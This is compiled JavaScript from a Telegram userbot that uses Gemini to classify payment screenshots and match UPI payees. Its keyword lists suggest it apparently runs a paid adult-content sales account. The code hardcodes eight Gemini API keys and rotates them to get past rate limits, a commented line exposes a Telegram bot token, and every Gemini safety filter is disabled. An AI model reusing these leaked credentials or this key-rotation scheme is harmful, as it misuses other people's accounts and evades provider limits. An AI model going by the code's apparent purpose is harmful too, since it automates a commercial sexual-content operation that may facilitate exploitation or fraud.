    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.setGeminiModel = setGeminiModel;
exports.countWord = countWord;
exports.convertToJSON = convertToJSON;
exports.askGemini = askGemini;
const generative_ai_1 = __webpack_require__(/*! @google/generative-ai */ "@google/generative-ai");
const utils_1 = __webpack_require__(/*! ../utils */ "./src/utils.ts");
const parseError_1 = __webpack_require__(/*! ../utils/parseError */ "./src/utils/parseError.ts");
const Helpers_1 = __webpack_require__(/*! telegram/Helpers */ "telegram/Helpers");
// Set the generation configuration
const generationConfig = {
    temperature: 0.2, // Reduced for more consistent responses
    topP: 0.8, // More focused responses
    topK: 20, // Reduced for better consistency
    maxOutputTokens: 8192,
    responseMimeType: "application/json",
    responseSchema: {
        type: generative_ai_1.SchemaType.OBJECT,
        description: "Schema for payment information extracted from an image with strict validation.",
        properties: {
            text: {
                type: generative_ai_1.SchemaType.STRING,
                description: "Complete text extracted from the image(including payment information and Advertisements), preserving formatting and structure."
            },
            isPayment: {
                type: generative_ai_1.SchemaType.BOOLEAN,
                description: "True ONLY if image contains clear payment/transaction evidence (receipts, bank statements, payment confirmations, etc.)"
            },
            isFinished: {
                type: generative_ai_1.SchemaType.BOOLEAN,
                description: "True ONLY if payment is completed/processed. False for pending, failed, or non-payment images."
            },
            isFailed: {
                type: generative_ai_1.SchemaType.BOOLEAN,
                description: "True if payment explicitly failed, was declined, or contains refund/chargeback terms. False for successful or non-payment images."
            },
            isSuccess: {
                type: generative_ai_1.SchemaType.BOOLEAN,
                description: "True ONLY if payment was explicitly successful/completed. Must have clear success indicators."
            },
            amount: {
                type: generative_ai_1.SchemaType.NUMBER,
                description: "Exact payment amount as number (no currency symbols). Use 0 for non-payment images or if amount is unclear."
            },
            time: {
                type: generative_ai_1.SchemaType.STRING,
                description: "Payment timestamp in ISO format (YYYY-MM-DDTHH:MM:SS) or partial format. Convert AM/PM to 24-hour. Use empty string if not found."
            },
            payeeName: {
                type: generative_ai_1.SchemaType.STRING,
                description: "Name of payment recipient/merchant. Use empty string if not clearly identifiable."
            },
            payerName: {
                type: generative_ai_1.SchemaType.STRING,
                description: "Name of person/entity making payment. Use empty string if not clearly identifiable."
            },
            description: {
                type: generative_ai_1.SchemaType.STRING,
                description: "Concise description of image content and payment context (2-3 sentences max)."
            },
            isInappropriate: {
                type: generative_ai_1.SchemaType.BOOLEAN,
                description: "True if image contains sexually explicit, violent, or inappropriate content."
            },
            confidence: {
                type: generative_ai_1.SchemaType.NUMBER,
                description: "Confidence score (0.0 to 1.0) about the accuracy of extracted information."
            }
        },
        required: [
            "text",
            "isPayment",
            "isFinished",
            "isFailed",
            "isSuccess",
            "amount",
            "time",
            "payeeName",
            "payerName",
            "description",
            "isInappropriate"
        ]
    },
};
// Set the safety settings
const safetySettings = [
    {
        category: generative_ai_1.HarmCategory.HARM_CATEGORY_HARASSMENT,
        threshold: generative_ai_1.HarmBlockThreshold.BLOCK_NONE,
    },
    {
        category: generative_ai_1.HarmCategory.HARM_CATEGORY_HATE_SPEECH,
        threshold: generative_ai_1.HarmBlockThreshold.BLOCK_NONE,
    },
    {
        category: generative_ai_1.HarmCategory.HARM_CATEGORY_SEXUALLY_EXPLICIT,
        threshold: generative_ai_1.HarmBlockThreshold.BLOCK_NONE,
    },
    {
        category: generative_ai_1.HarmCategory.HARM_CATEGORY_DANGEROUS_CONTENT,
        threshold: generative_ai_1.HarmBlockThreshold.BLOCK_NONE,
    },
];
const GEMINI_MODELS = ["gemini-2.0-flash-exp", "gemini-2.0-flash", "gemini-1.5-flash", "gemini-1.5-flash-8b"];
let currentModelIndex = 0;
let currentModel = GEMINI_MODELS[currentModelIndex];
function setGeminiModel(modelName) {
    if (GEMINI_MODELS.includes(modelName)) {
        currentModel = modelName;
        currentModelIndex = GEMINI_MODELS.indexOf(modelName);
        return true;
    }
    return false;
}
function rotateToNextModel() {
    currentModelIndex = (currentModelIndex + 1) % GEMINI_MODELS.length;
    currentModel = GEMINI_MODELS[currentModelIndex];
    console.log(`Switched to model: ${currentModel}`);
    return currentModel;
}
// Enhanced prompt with more specific instructions
const prompt = `
CRITICAL INSTRUCTIONS: You are a payment transaction analyzer. Analyze this image with extreme precision and follow these rules EXACTLY:

**PAYMENT DETECTION RULES:**
1. Image is a PAYMENT only if it shows:
   - Bank/payment app screenshots with transaction details
   - Digital receipts or invoices with clear payment confirmation
   - Credit card statements or bank statements
   - Payment confirmation screens
   - Money transfer confirmations

2. NOT PAYMENTS: Screenshots of balances, account info, chat messages about payments, memes, or general app screenshots

**DATA EXTRACTION REQUIREMENTS:**
- Amount: Extract ONLY the main transaction amount (ignore fees, balances). Must be a clean number.
- Time: Convert to ISO format. If only date: YYYY-MM-DD. If time included: YYYY-MM-DDTHH:MM:SS
- Names: Extract exact names as shown (don't guess or assume)
- Status Logic:
  * isPayment: true ONLY for actual payment transactions
  * isSuccess: true ONLY if payment shows "successful", "completed", "paid" status
  * isFailed: true ONLY if shows "failed", "declined", "refunded", "cancelled"
  * isFinished: true if payment is completed (successful OR failed)

**REFUND/REVERSAL HANDLING:**
- If image shows refund/reversal: isPayment=true, isFailed=true, isSuccess=false
- Amount should be the refunded amount
- Description should mention "refund" or "reversal"

**CONFIDENCE SCORING:**
- 0.9-1.0: Clear payment with all details visible
- 0.7-0.8: Payment visible but some details unclear
- 0.5-0.6: Possible payment but ambiguous
- 0.0-0.4: Not a payment or very unclear

**QUALITY CHECKS:**
- Read ALL text carefully before making decisions
- Don't assume context - only use what's clearly visible
- If unsure about any field, use conservative values (empty string, false, 0)
- Provide honest confidence scores

**OUTPUT FORMAT:**
Return ONLY valid JSON matching the exact schema. No explanations or additional text.

ANALYZE THE IMAGE NOW:`;
// Enhanced word counting function
function countWord(text) {
    if (!text || typeof text !== 'string') {
        return 0;
    }
    const cleanedText = text.replace(/[^a-zA-Z\s]+/g, ' ').toLowerCase();
    const trimmedText = cleanedText.trim().replace(/[\r\n]+/g, ' ');
    const words = trimmedText.split(/\s+/); // Use \s+ to handle multiple spaces
    const longWords = words.filter(word => word.length > 2);
    return longWords.length; // Return the length of the filtered array
}
// Convert text to JSON format based on schema
function convertToJSON(text) {
    const defaultResponse = {
        amount: 0,
        isPayment: false,
        isFailed: false,
        payeeName: "",
        payerName: "",
        text: '',
        description: 'Processing failed',
        wordCount: 0,
        time: "",
        isFinished: false,
        isSuccess: false,
        isInappropriate: false,
        error: true,
        confidence: 0
    };
    if (!text) {
        return defaultResponse;
    }
    // If already an object, validate it
    if (typeof text === 'object') {
        return validateAndCleanResponse(text);
    }
    try {
        // Clean the text more thoroughly
        let cleanedText = text.trim();
        // Remove markdown code blocks
        cleanedText = cleanedText.replace(/```json\n?/gi, '').replace(/```\n?/gi, '');
        // Remove any leading/trailing non-JSON content
        const jsonStart = cleanedText.indexOf('{');
        const jsonEnd = cleanedText.lastIndexOf('}');
        if (jsonStart !== -1 && jsonEnd !== -1 && jsonEnd > jsonStart) {
            cleanedText = cleanedText.slice(jsonStart, jsonEnd + 1);
        }
        const jsonData = JSON.parse(cleanedText);
        return validateAndCleanResponse(jsonData);
    }
    catch (error) {
        console.error("JSON parsing failed:", error);
        console.log("Raw text:", text);
        // Try to extract some basic info even if JSON parsing fails
        const extractedData = extractBasicInfo(text);
        return Object.assign(Object.assign(Object.assign({}, defaultResponse), extractedData), { error: true });
    }
}
// Validate and clean the response to ensure consistency
function validateAndCleanResponse(data) {
    const cleaned = {
        amount: parseFloat(data.amount || 0) || 0,
        isPayment: Boolean(data.isPayment),
        isFailed: Boolean(data.isFailed),
        payeeName: String(data.payeeName || "").trim(),
        payerName: String(data.payerName || "").trim(),
        text: String(data.text || "").trim(),
        description: String(data.description || "No description available").trim(),
        wordCount: 0, // Will be calculated later
        time: String(data.time || "").trim(),
        isFinished: Boolean(data.isFinished),
        isSuccess: Boolean(data.isSuccess),
        isInappropriate: Boolean(data.isInappropriate),
        error: false,
        confidence: Math.max(0, Math.min(1, parseFloat(data.confidence || 0))),
    };
    // Logical validation
    if (!cleaned.isPayment) {
        cleaned.isSuccess = false;
        cleaned.isFailed = false;
        cleaned.isFinished = false;
        cleaned.amount = 0;
        cleaned.payeeName = "";
        cleaned.payerName = "";
        cleaned.time = "";
    }
    // Success/failure logic
    if (cleaned.isSuccess && cleaned.isFailed) {
        // Can't be both - prioritize the one with higher confidence context
        if (cleaned.description.toLowerCase().includes('success') ||
            cleaned.description.toLowerCase().includes('completed')) {
            cleaned.isFailed = false;
        }
        else {
            cleaned.isSuccess = false;
        }
    }
    cleaned.isFinished = cleaned.isSuccess || cleaned.isFailed;
    cleaned.wordCount = countWord(cleaned.text);
    return cleaned;
}
// Fallback extraction for when JSON parsing fails
function extractBasicInfo(text) {
    const info = {
        text: text,
        description: "Failed to parse JSON response",
        confidence: 0.1
    };
    // Try to extract some basic payment indicators
    const paymentKeywords = /payment|transaction|transfer|receipt|invoice|paid|charge/i;
    if (paymentKeywords.test(text)) {
        info.isPayment = true;
        info.confidence = 0.3;
    }
    // Try to extract amount
    const amountMatch = text.match(/[\$€£¥₹]\s*(\d+(?:,\d{3})*(?:\.\d{2})?)/);
    if (amountMatch) {
        info.amount = parseFloat(amountMatch[1].replace(/,/g, ''));
    }
    return info;
}
// Enhanced askGemini function with better error handling and validation
function askGemini(buffer) {
    return __awaiter(this, void 0, void 0, function* () {
        const defaultResponse = {
            amount: 0,
            isPayment: false,
            isFailed: false,
            payeeName: "",
            payerName: "",
            text: '',
            description: 'Gemini API failed',
            wordCount: 0,
            time: "",
            isFinished: false,
            isSuccess: false,
            isInappropriate: false,
            error: true,
            confidence: 0
        };
        const apiKeys = [
            'AIzaSyBtyPFKe9Wp1jrJaAG8VAe6Ru2yuYJzeFY',
            'AIzaSyBGQu0rsdZZYRKIe1Zveyh6sITorvQz54A',
            'AIzaSyA2uKIE1vvgU-o_vHjMIyeykrnOY1lYrxg',
            "AIzaSyCNMWFS1ypxSC2wBCgZciKr91cFuI0xM4Y",
            'AIzaSyCDEy5t9JgkFath1dihqeYsM7V8vNC51T0',
            'AIzaSyBioek8BDN0CKrYvXY5yUYczHxCBZhaj0c',
            'AIzaSyB6a9Tw6Jnka18iI358U2eTfUfJWlYzMFY',
            'AIzaSyBjh38dNGfrXb4MtEI3NfP4zyd6pA08fTI'
        ];
        const maxRetries = GEMINI_MODELS.length;
        const maxModelRetries = GEMINI_MODELS.length;
        let modelRetryCount = 0;
        let lastError = null;
        for (let attempt = 0; attempt <= maxRetries; attempt++) {
            const selectedKey = (0, utils_1.selectRandomElements)(apiKeys, 1)[0];
            try {
                const genAI = new generative_ai_1.GoogleGenerativeAI(selectedKey);
                const model = genAI.getGenerativeModel({
                    model: currentModel,
                    generationConfig,
                    safetySettings,
                });
                // Create a more robust chat session
                const chatSession = model.startChat({
                    generationConfig,
                    safetySettings,
                    history: [],
                });
                // Prepare the image data
                const imageData = {
                    inlineData: {
                        data: buffer.toString('base64'),
                        mimeType: "image/png"
                    }
                };
                console.log(`Attempting with model: ${currentModel}, attempt: ${attempt + 1}`);
                // Send the request with timeout
                const result = yield Promise.race([
                    chatSession.sendMessage([imageData, prompt]),
                    new Promise((_, reject) => setTimeout(() => reject(new Error('Request timeout')), 30000))
                ]);
                const response = result.response;
                const text = response.text();
                console.log("Raw Gemini response:", text);
                const parsedData = convertToJSON(text);
                console.log(parsedData);
                parsedData['wordCount'] = countWord(parsedData.text);
                // If successful, break out of the retry loop
                parsedData.error = false;
                console.log("Parsed data:", parsedData);
                return parsedData;
            }
            catch (error) {
                lastError = error;
                const errorDetails = (0, parseError_1.parseError)(error, `Gemini request failed: ${selectedKey}`, true);
                console.error(`Model: ${currentModel}, Error:`, errorDetails);
                // Handle different types of errors
                if (errorDetails.status >= 500 && errorDetails.status < 600 && modelRetryCount < maxModelRetries) {
                    console.warn(`Server error, rotating to next model`);
                    rotateToNextModel();
                    modelRetryCount++;
                    attempt = -1; // Reset attempt counter for new model
                    continue;
                }
                if (errorDetails.status === 429) {
                    const delay = Math.min(1000 * Math.pow(2, attempt), 10000);
                    console.warn(`Rate limited, waiting ${delay}ms before retry`);
                    yield (0, Helpers_1.sleep)(delay);
                    continue;
                }
                if (errorDetails.status === 400) {
                    console.error("Bad request - possibly invalid image format");
                    break; // Don't retry on bad requests
                }
                // For other errors, try with different API key
                if (attempt < maxRetries) {
                    yield (0, Helpers_1.sleep)(1000 * (attempt + 1));
                }
            }
        }
        console.error("All attempts failed, returning default response");
        return Object.assign(Object.assign({}, defaultResponse), { description: `All attempts failed: ${(lastError === null || lastError === void 0 ? void 0 : lastError.message) || 'Unknown error'}` });
    });
}


/***/ }),

/***/ "./src/helpers/imageDetails.ts":
/*!*************************************!*\
  !*** ./src/helpers/imageDetails.ts ***!
  \*************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.getImageDetails = getImageDetails;
exports.localImage = localImage;
const logbots_1 = __webpack_require__(/*! ../utils/logbots */ "./src/utils/logbots.ts");
const fetchWithTimeout_1 = __webpack_require__(/*! ../utils/fetchWithTimeout */ "./src/utils/fetchWithTimeout.ts");
const customImage_1 = __webpack_require__(/*! ./customImage */ "./src/helpers/customImage.ts");
const gemini_1 = __webpack_require__(/*! ./gemini */ "./src/helpers/gemini.ts");
const parseImage_1 = __webpack_require__(/*! ./parseImage */ "./src/helpers/parseImage.ts");
const form_data_1 = __importDefault(__webpack_require__(/*! form-data */ "form-data"));
function getImageDetails(photoBuffer) {
    return __awaiter(this, void 0, void 0, function* () {
        const imageData = yield (0, gemini_1.askGemini)(photoBuffer);
        if (!imageData.error) {
            return imageData;
        }
        else {
            yield (0, fetchWithTimeout_1.fetchWithTimeout)(`${(0, logbots_1.ppplbot)()}&text=${encodeURIComponent(`@${process.env.clientId.toUpperCase()}\nGeminiFailed : Trying with localImageProcess`)}`);
            const ocrResponse = yield localImage(photoBuffer);
            console.log('Words:', ocrResponse.words, "| Text:", ocrResponse ? ocrResponse.value : '');
            if (ocrResponse.words > 2 && (0, parseImage_1.isPayment)(ocrResponse.value.toLowerCase())) {
                return yield (0, customImage_1.customanalyseImage)(ocrResponse.imageId);
            }
            else {
                yield (0, fetchWithTimeout_1.fetchWithTimeout)(`${(0, logbots_1.ppplbot)()}&text=${encodeURIComponent(`@${process.env.clientId.toUpperCase()}\nlocal Image unwanted`)}`);
                return {
                    amount: 0,
                    isPayment: false,
                    isFailed: true,
                    payeeName: null,
                    payerName: null,
                    text: ocrResponse.value,
                    description: 'Unwanted Image',
                    wordCount: 0,
                    time: null,
                    isFinished: false,
                    isSuccess: false,
                    isInappropriate: false,
                    error: false,
                    confidence: 0
                };
            }
        }
    });
}
function localImage(photoBuffer) {
    return __awaiter(this, void 0, void 0, function* () {
        var _a;
        const form = new form_data_1.default();
        const imageId = Math.floor(10000 + Math.random() * 90000);
        form.append("image", photoBuffer, {
            filename: `image_${imageId}.jpg`,
            contentType: "image/jpeg"
        });
        const response = yield (0, fetchWithTimeout_1.fetchWithTimeout)(`${process.env.chatgptserver}/localimage`, {
            method: 'POST',
            data: form,
            headers: Object.assign({ 'accept': '*/*', 'Content-Type': 'application/json' }, form.getHeaders()),
            timeout: 120000
        });
        if ((response === null || response === void 0 ? void 0 : response.status) == 200) {
            console.log('LocalImageData- ', response.data);
            return Object.assign(Object.assign({}, ((_a = response.data) === null || _a === void 0 ? void 0 : _a.data)), { imageId });
        }
        else {
            console.log('Some Error');
            return ({ words: 10, value: '', imageId });
        }
    });
}


/***/ }),

/***/ "./src/helpers/parseImage.ts":
/*!***********************************!*\
  !*** ./src/helpers/parseImage.ts ***!
  \***********************************/
/***/ ((__unused_webpack_module, exports, __webpack_require__) => {


Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.parseImage = parseImage;
exports.isPaymentMine = isPaymentMine;
exports.isPayment = isPayment;
exports.isLocalFailed = isLocalFailed;
const UpiClass_1 = __webpack_require__(/*! ../UpiClass */ "./src/UpiClass.ts");
const inhandlerUpdated_1 = __webpack_require__(/*! ../inhandlerUpdated */ "./src/inhandlerUpdated.ts");
function parseImage(imageData) {
    const sanitizedData = {
        isPaymentRelated: isPaymentRelated(imageData),
        isFinishedPayment: isValidPayment(imageData),
        isFailedPayment: isFailedPayment(imageData),
        isPaymentMine: isPaymentMine(imageData),
    };
    return sanitizedData;
}
const getupiKeys = () => {
    return UpiClass_1.UpiIds.allIds.map(upiId => upiId.split('@')[0]).filter(Boolean);
};
function isPaymentMine(imageData) {
    var _a;
    const keywordsToCheck = [...getupiKeys(), 'lakshmi', 'ravva', 'reddy g', 'ddy girl', (_a = process.env.name) === null || _a === void 0 ? void 0 : _a.split(' ')[0].toLowerCase(), "paidgirl", "redgir", "137045557", "8000073302", '210249262', "bharatpemerchant", "bharatpe merchant", "shetty", "community", "0851610820", 'girls', 'community'];
    return imageData.wordCount > 2 && (0, inhandlerUpdated_1.contains)(`${imageData.payeeName} ${imageData.payerName} ${imageData.text}`, keywordsToCheck);
}
function isFailedPayment(imageData) {
    return imageData.isFailed;
}
function isValidPayment(imageData) {
    return imageData.isFinished &&
        !(0, inhandlerUpdated_1.contains)(imageData.text, [
            'failed to connect', 'fazlu rehman',
            'genuine paid girl', 'call just', 'select payment method',
            'unable to process', 'sending money',
            'interactions', 'add upi', 'try after', 'google ads', 'pay secure',
            'googleads', 'payable', 'channel created', 'photo updated',
            'joined this channel', 'subscribers', 'members,', 'user not found',
            'username not found', 'user does not exist', 'payment requests',
            'money through', "genuine sex", "on tapping", "debit from",
            'scan the qr', "failed to connect", "on pressing", "on clicking", 'enter new',
            'search name', "netlify", "scan the qr", "fetched", "free demo"
        ]) &&
        (!(0, inhandlerUpdated_1.contains)(imageData.text, ['paying', 'proceed', 'process', 'pending']) ||
            ((0, inhandlerUpdated_1.contains)(imageData.text, ['paying', 'proceed', 'process', 'pending']) && (0, inhandlerUpdated_1.contains)(imageData.text, ['paid', 'pay again', 'debited', 'payment took', 'successful', 'completed', 'finished', 'sent']))) &&
        (!(0, inhandlerUpdated_1.contains)(imageData.text, ['enter amount']) ||
            ((0, inhandlerUpdated_1.contains)(imageData.text, ['enter amount']) && !(0, inhandlerUpdated_1.containsAll)(imageData.text, ['banking', 'joined', 'pay', 'request']) && (0, inhandlerUpdated_1.contains)(imageData.text, ['split', 'payment took', 'successful', 'paid', 'sent secure'])));
}
function isPaymentRelated(imageData) {
    return imageData.isPayment;
}
function isPayment(textLower) {
    const keywordsToCheck = ["reddy", "paidgirl", 'amount', "ravva", 'balance', "bharatpemerchant", "failed", "bharatpe merchant", "shetty", "community", "lakshmi", "0851610820",
        'payment', 'successful', 'payment', 'girls', '8000073302', 'community', "137045557", '210249262', 'success', 'paid', 'phonepe', 'transaction', 'sent secure', 'transfer', 'paytm', 'bhim', ...getupiKeys()];
    return (0, inhandlerUpdated_1.contains)(textLower, keywordsToCheck) && !(0, inhandlerUpdated_1.contains)(textLower, ['failed to connect', 'fazlu rehman', 'genuine paid girl']);
}
function isLocalFailed(imageData) {
    const invalidKeywords = ["failed", "pending", 'not enough', 'will be refund',
        'no money left', "invalid", 'declined', 'unsuccessful',
        "demo nude", "demo video", "demo voice", 'insuffi', 'not suffic', "unable",
        "demo video", , "technical", "server", "blocked", "not debited", "glitch", "unavailable",
        "try a", "after sometime", "not been debited", "exceeded", "refund"];
    const text = imageData.text.toLowerCase();
    return ((((0, inhandlerUpdated_1.contains)(text, invalidKeywords) && !(0, inhandlerUpdated_1.contains)(text, ['to connect', 'make paytm your default']))
        || ((0, inhandlerUpdated_1.contains)(text, ['process']) && !(0, inhandlerUpdated_1.contains)(text, ['successful', 'completed', 'finished']))));
}


/***/ }),

/***/ "./src/index.ts":
/*!**********************!*\
  !*** ./src/index.ts ***!
  \**********************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.tgClass = exports.sendPing = exports.globalCanReply = void 0;
exports.setReply = setReply;
exports.daysLeftForRelease = daysLeftForRelease;
exports.requestCall = requestCall;
exports.getUserStats = getUserStats;
exports.getDemoStats = getDemoStats;
exports.generateRandomInt = generateRandomInt;
exports.deleteCallRequest = deleteCallRequest;
exports.initiateCall = initiateCall;
exports.sendMessageWithButton = sendMessageWithButton;
console.log("in Index");
(__webpack_require__(/*! dotenv */ "dotenv").config)();
const telegram_1 = __webpack_require__(/*! telegram */ "telegram");
const dbservice_1 = __webpack_require__(/*! ./dbservice */ "./src/dbservice.ts");
const sessions_1 = __webpack_require__(/*! telegram/sessions */ "telegram/sessions");
// import input from "input"; // npm i input
const events_1 = __webpack_require__(/*! telegram/events */ "telegram/events");
const inhandlerUpdated_1 = __webpack_require__(/*! ./inhandlerUpdated */ "./src/inhandlerUpdated.ts");
const outhandler_1 = __webpack_require__(/*! ./outhandler */ "./src/outhandler.ts");
const utils_1 = __webpack_require__(/*! ./utils */ "./src/utils.ts");
const Helpers_1 = __webpack_require__(/*! telegram/Helpers */ "telegram/Helpers");
const app_1 = __webpack_require__(/*! ./app */ "./src/app.ts");
const messages_1 = __webpack_require__(/*! ./messages */ "./src/messages.ts");
const phonestate_1 = __webpack_require__(/*! ./phonestate */ "./src/phonestate.ts");
const big_integer_1 = __importDefault(__webpack_require__(/*! big-integer */ "big-integer"));
const UpiClass_1 = __webpack_require__(/*! ./UpiClass */ "./src/UpiClass.ts");
const parseImage_1 = __webpack_require__(/*! ./helpers/parseImage */ "./src/helpers/parseImage.ts");
const imageDetails_1 = __webpack_require__(/*! ./helpers/imageDetails */ "./src/helpers/imageDetails.ts");
const isWithinPastTenMinutes_1 = __importDefault(__webpack_require__(/*! ./utils/isWithinPastTenMinutes */ "./src/utils/isWithinPastTenMinutes.ts"));
const parseError_1 = __webpack_require__(/*! ./utils/parseError */ "./src/utils/parseError.ts");
const fetchWithTimeout_1 = __webpack_require__(/*! ./utils/fetchWithTimeout */ "./src/utils/fetchWithTimeout.ts");
const respondToMsgs_1 = __webpack_require__(/*! ./respondToMsgs */ "./src/respondToMsgs.ts");
const withTimeout_1 = __webpack_require__(/*! ./utils/withTimeout */ "./src/utils/withTimeout.ts");
const promotions_1 = __webpack_require__(/*! ./utils/promotions */ "./src/utils/promotions.ts");
const logbots_1 = __webpack_require__(/*! ./utils/logbots */ "./src/utils/logbots.ts");
const React_1 = __webpack_require__(/*! ./utils/React */ "./src/utils/React.ts");
const TelegramBots_config_1 = __webpack_require__(/*! ./utils/TelegramBots.config */ "./src/utils/TelegramBots.config.ts");
const common_1 = __webpack_require__(/*! ./common */ "./src/common.ts");
const eventsMap = new Map();
const failedMap = new Map();
const invalidPhotosMap = new Map();
const plsMap = new Map();
const cheatMap = new Map();
let totalPic = 0;
let phoneCall = undefined;
let phoneCallQueue = [];
const picEventsQueue = [];
let days = -1;
exports.globalCanReply = true;
function setReply(value) {
    exports.globalCanReply = value;
}
function daysLeftForRelease() {
    return days;
}
//const ppplbot = `https://api.telegram.org/bot6735591051:AAELwIkSHegcBIVv5pf484Pn09WNQj1Nl54/sendMessage?chat_id=${process.env.updatesChannel}`;
const db = dbservice_1.UserDataDtoCrud.getInstance();
let retryTime = 0;
exports.sendPing = false;
setTimeout(() => __awaiter(void 0, void 0, void 0, function* () {
    yield retryConnection();
    setInterval(() => __awaiter(void 0, void 0, void 0, function* () {
        var _a, _b;
        if (!exports.sendPing || !tgClass.getClient()) {
            yield (0, fetchWithTimeout_1.fetchWithTimeout)(`${(0, logbots_1.ppplbot)()}&text=${encodeURIComponent(`${process.env.clientId}: EventHandler issue as-\nProcessId:${app_1.prcessID}\nMongo-${(_a = dbservice_1.UserDataDtoCrud.getInstance()) === null || _a === void 0 ? void 0 : _a.isConnected}\nTGClient-${(_b = tgClass.getClient()) === null || _b === void 0 ? void 0 : _b.connected}\nRetryCount: ${retryTime}`)}`);
        }
        yield retryConnection();
    }), 120000);
}), 20000);
function getAllEnvironmentVariables() {
    return process.env;
}
function retryConnection() {
    return __awaiter(this, void 0, void 0, function* () {
        var _a, _b, _c, _d;
        yield tgClass.connect();
        try {
            yield ((_a = tgClass.getClient()) === null || _a === void 0 ? void 0 : _a.invoke(new telegram_1.Api.messages.SetTyping({
                peer: 'me',
                action: new telegram_1.Api.SendMessageTypingAction(),
            })));
        }
        catch (error) {
        }
        if (exports.sendPing && ((_b = dbservice_1.UserDataDtoCrud.getInstance()) === null || _b === void 0 ? void 0 : _b.isConnected) && ((_c = tgClass.getClient()) === null || _c === void 0 ? void 0 : _c.connected)) {
            try {
                yield (0, fetchWithTimeout_1.fetchWithTimeout)(`${process.env.uptimebot}/receive?clientId=${(_d = process.env.clientId) === null || _d === void 0 ? void 0 : _d.toLowerCase()}`, {});
            }
            catch (error) {
                (0, parseError_1.parseError)(error, "Cannot fetch pinger:");
            }
            retryTime = 0;
        }
        else {
            retryTime++;
            if (retryTime > 1) {
                // await fetchWithTimeout(`${ppplbot()}&text=${encodeURIComponent(`${process.env.clientId}: Exitting as-\nProcessId:${prcessID}\nMongo-${UserDataDtoCrud.getInstance()?.isConnected}\nTGClient-${tgClass.getClient()?.connected}\nRetryCount: ${retryTime}`)}`);
            }
            if (retryTime > 5) {
                console.log("Exitiing");
                // await fetchWithTimeout(`${process.env.uptimebot}/refreshmap`)
                yield (dbservice_1.UserDataDtoCrud.getInstance()).closeConnection();
                // const environmentVariables = getAllEnvironmentVariables();
                yield (0, fetchWithTimeout_1.fetchWithTimeout)(`${(0, logbots_1.ppplbot)()}&text=${encodeURIComponent(`${process.env.clientId}: Instance does not exist!! ALL GOOD`)}`);
                process.exit(1);
                //execSync("refresh");
            }
            if (!process.env.repl.includes("glitch")) {
                const resp = yield (0, fetchWithTimeout_1.fetchWithTimeout)(`${process.env.repl}/getProcessId`, { timeout: 100000 });
                try {
                    const data = yield resp.data;
                    if (parseInt(data.ProcessId) === app_1.prcessID) {
                        console.log('Sending Req to Check Health: ', `${process.env.uptimebot}/tgclientoff/${app_1.prcessID}?clientId=${process.env.clientId}`);
                        const respon = yield (0, fetchWithTimeout_1.fetchWithTimeout)(`${process.env.uptimebot}/tgclientoff/${app_1.prcessID}?clientId=${process.env.clientId}`);
                        // if (!respon.data) {
                        //     console.log("EXITTING")
                        //     process.exit(1);
                        // }
                    }
                    else {
                        console.log("EXITTING");
                        process.exit(1);
                    }
                }
                catch (error) {
                    console.log('Cannot fetch pinger', error);
                }
            }
            else {
                const respon = yield (0, fetchWithTimeout_1.fetchWithTimeout)(`${process.env.uptimebot}/tgclientoff/${app_1.prcessID}?clientId=${process.env.clientId}`);
                if (!respon.data) {
                    console.log("EXITTING");
                    process.exit(1);
                }
            }
        }
        exports.sendPing = false;
    });
}
class tgClass {
    constructor() {
        console.log('-------------IN MAIN CONSTRUCTOR-----------');
        if (!tgClass.client) {
            // Create client with optimized connection settings
            tgClass.client = new telegram_1.TelegramClient(new sessions_1.StringSession(process.env.session), parseInt(process.env.apiId), process.env.apiHash, {
                connectionRetries: 10,
                requestRetries: 10,
                retryDelay: 3000,
                timeout: 60000,
                autoReconnect: true,
                useWSS: true,
                maxConcurrentDownloads: 3,
                downloadRetries: 10,
                floodSleepThreshold: 180,
                deviceModel: "Desktop",
                systemVersion: "Windows 10",
                appVersion: "1.0.0",
                useIPV6: true,
                testServers: false,
            });
            // const originalErrorHandler = tgClass.client._errorHandler;
            // tgClass.client._errorHandler = async (err) => {
            //     console.log(`Telegram client error:`, err);
            //     if (originalErrorHandler) await originalErrorHandler(err);
            // };
        }
        this.main();
    }
    static refreshConnection() {
        return __awaiter(this, void 0, void 0, function* () {
            const currentTime = Date.now();
            if (currentTime - this.lastRefreshTime < 5 * 60 * 1000) {
                console.log("Refresh connection skipped: executed within the last 5 minutes.");
                return;
            }
            this.lastRefreshTime = currentTime;
            console.log("Refreshing Telegram Client Connection...");
            try {
                if (tgClass.client) {
                    yield tgClass.client.disconnect();
                    console.log("Client disconnected successfully.");
                }
                yield (0, Helpers_1.sleep)(2000); // Wait for 2 seconds before reconnecting
                yield tgClass.client.connect();
